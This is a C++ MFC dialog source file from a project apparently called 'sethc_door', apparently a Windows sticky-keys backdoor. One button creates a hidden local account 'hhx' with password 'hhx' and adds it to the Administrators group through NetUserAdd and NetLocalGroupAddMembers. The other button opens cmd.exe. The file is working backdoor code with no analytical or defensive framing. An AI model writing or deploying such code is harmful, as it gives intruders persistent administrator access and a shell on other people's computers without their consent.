// setDialog.cpp : implementation file
//

#include "StdAfx.h"
#include "sethc_door.h"
#include "setDialog.h"

#include <windows.h> 
#include <lm.h>
#pragma comment(lib,"netapi32")

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CsetDialog dialog


CsetDialog::CsetDialog(CWnd* pParent /*=NULL*/)
	: CDialog(CsetDialog::IDD, pParent)
{
	//{{AFX_DATA_INIT(CsetDialog)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
}


void CsetDialog::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CsetDialog)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CsetDialog, CDialog)
	//{{AFX_MSG_MAP(CsetDialog)
	ON_BN_CLICKED(IDC_BUTTON1, OnAdduser)
	ON_BN_CLICKED(IDC_BUTTON2, OnCmd)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CsetDialog message handlers

void CsetDialog::OnAdduser() 
{
	// TODO: Add your control notification handler code here
	USER_INFO_1 ui;
	DWORD dwError = 0;

	ui.usri1_name = L"hhx";
	ui.usri1_password = L"hhx";
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_SCRIPT;
	ui.usri1_script_path = NULL;

	if (NetUserAdd(0, 1, (LPBYTE)&ui, &dwError)==NERR_Success)
	{
		MessageBox("Add success!");
	} else
	{
		MessageBox("Add Error!");
	}

	wchar_t szAccountName[100] = {0};
	wcscpy(szAccountName, L"hhx");
	
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname = szAccountName;
	if (NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1) == NERR_Success)
	{
		MessageBox("Add to administrator success.");
	} else
	{
		MessageBox("Add to admin ERRORRRR!");
	}
	
}

void CsetDialog::OnCancel() 
{
	// TODO: Add extra cleanup here
	
	CDialog::OnCancel();
}

void CsetDialog::OnCmd() 
{
	// TODO: Add your control notification handler code here
	WinExec("cmd.exe", SW_SHOW);
	
}
